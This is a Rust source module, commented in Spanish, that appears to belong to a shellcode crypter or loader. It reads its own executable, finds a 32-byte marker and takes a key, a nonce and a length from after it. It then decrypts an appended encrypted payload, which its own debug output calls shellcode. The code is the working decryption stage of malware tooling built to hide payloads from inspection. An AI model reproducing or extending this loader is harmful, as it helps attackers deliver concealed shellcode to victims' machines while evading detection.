use std::env;
use std::fs::File;
use std::io::Read;

use crate::crypto::config::CONFIG;
use crate::crypto::decrypt::decrypt_payload;
use crate::debug;

pub fn extract_and_decrypt_payload() -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let exe_path = env::current_exe()?;
    let mut buffer = Vec::new();
    File::open(&exe_path)?.read_to_end(&mut buffer)?;

    let marker_to_find = unsafe { (*(&raw const CONFIG)).marker };

    let marker_pos = buffer
        .windows(32)
        .rposition(|window| window == marker_to_find)
        .ok_or("Marcador no encontrado")?;

    debug!("[DEBUG] Marcador encontrado en posición: {}", marker_pos);
    debug!("[DEBUG] Tamaño total del ejecutable: {} bytes", buffer.len());
    debug!("[DEBUG] Distancia desde el final hasta el marcador: {} bytes", buffer.len() - (marker_pos + 32));

    let key_start     = marker_pos + 32;
    let nonce_start   = key_start + 32;
    let size_start    = nonce_start + 12;
    let payload_start = size_start + 4;

    let key   = &buffer[key_start .. key_start + 32];
    let nonce = &buffer[nonce_start .. nonce_start + 12];

    let size_bytes: [u8; 4] = buffer[size_start..payload_start]
        .try_into()
        .map_err(|_| "Error leyendo los 4 bytes del tamaño")?;

    let payload_size = u32::from_le_bytes(size_bytes) as usize;
    let encrypted_payload = &buffer[payload_start .. payload_start + payload_size];

    debug!("[DEBUG] === METADATOS EXTRAÍDOS ===");
    debug!("[DEBUG] Key (primeros 16 bytes)     : {:02X?}", &key[..16]);
    debug!("[DEBUG] Nonce (completo)            : {:02X?}", nonce);
    debug!("[DEBUG] Size bytes (little endian)  : {:02X?} → {} bytes", size_bytes, payload_size);
    debug!("[DEBUG] Encrypted payload len       : {} bytes", encrypted_payload.len());
    debug!("[DEBUG] Primeros 16 bytes del payload cifrado : {:02X?}", &encrypted_payload[..16.min(encrypted_payload.len())]);

    if key.len() != 32 || nonce.len() != 12 || encrypted_payload.len() != payload_size {
        return Err(format!(
            "Longitudes inválidas → Key:{}, Nonce:{}, Size:{}, Encrypted:{}",
            key.len(), nonce.len(), payload_size, encrypted_payload.len()
        ).into());
    }

    let key_array: &[u8; 32] = key.try_into().unwrap();
    let nonce_array: &[u8; 12] = nonce.try_into().unwrap();

    let decrypted = decrypt_payload(&key_array, &nonce_array, encrypted_payload)?;

    println!("[DEBUG] ¡Shellcode DESENCRIPTADA CORRECTAMENTE!");
    println!("[DEBUG] Tamaño final: {} bytes", decrypted.len());
    println!("[DEBUG] Primeros 24 bytes del shellcode: {:02X?}", &decrypted[..24.min(decrypted.len())]);

    if decrypted.len() > 32 {
        debug!("[DEBUG] Bytes 24-48 del shellcode: {:02X?}", &decrypted[24..48.min(decrypted.len())]);
    }

    Ok(decrypted)
}
